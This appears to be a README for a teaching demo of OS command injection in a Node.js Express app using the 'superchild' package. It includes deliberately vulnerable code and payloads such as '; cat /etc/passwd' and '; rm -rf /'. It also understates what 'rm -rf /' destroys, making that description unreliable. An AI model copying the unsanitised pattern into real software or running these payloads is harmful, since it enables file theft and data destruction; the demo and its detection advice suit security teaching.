# Source Code
The purpose of this application is to demonstrate the capabilities of an OS command injection exploit using the Superchild npm package.

## superchild_exploitable.js
This file creates a simple web server, and allows a client to call the cat command to the server.

```
//Add dependencies
const express = require('express'),
      superchild = require('superchild'),
      fs = require('fs');

//Creates app
const app = express();
app.use(express.urlencoded({extended : true}));

//Sends form to client
app.get('/', (req, res) => {
  res.sendFile('index.html', {root: __dirname})
})

//Handles form submissions
app.post('/', (req, res) => {
  let filePath = req.body.filePath

  //Creates child process for cat
  let child = superchild('cat ' + filePath);
  //Sets callback for child output line event to call res.write(), sends ouptut to client
  child.on('stdout_line', function (line) {
    res.write(line + '\n');
  });
  //Sets callback for child "exit" event to call res.end(), completes http response
  child.on('exit', function () {
    res.end()
  });
});

//Starts app
app.listen(process.env.port || 8080);
```

# Running the sample
run the script via node:
```
foo@bar:~$ node superchild_exploitable.js
```

## Dependencies
You can install these with the following command `npm install <pkg>`

- express
- superchild

## Running application
Once a client submits the form with the `filePath` query to the server, the contents of that file path will be read to the client.

# Payload

## Procedure
- Go to `localhost:8080`
- Insert the payload via the form on the site (Ex. `; rm -rf /`)
  - `; cat /etc/passwd`
    - Command will read password folder to client.
  - `; rm -rf /`
    - Command will delete application directory and its contents.
  - `; /System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend`
    - If the server is running macOS, the command will lock the server computer.

##Syntax Searchability
To search for this vulnerability, search for this function call and check for an un-sanitized path to the user input.
`superchild(<command + user input>, other parameters...)`

To find if the application uses this package, search for it under the dependencies (Ex. `const superchild = require('superchild')`)

## Why it works?
Because the user input is not sanitized, the resulting command can be concatenated with arbitrary commands, separated by a semicolon.
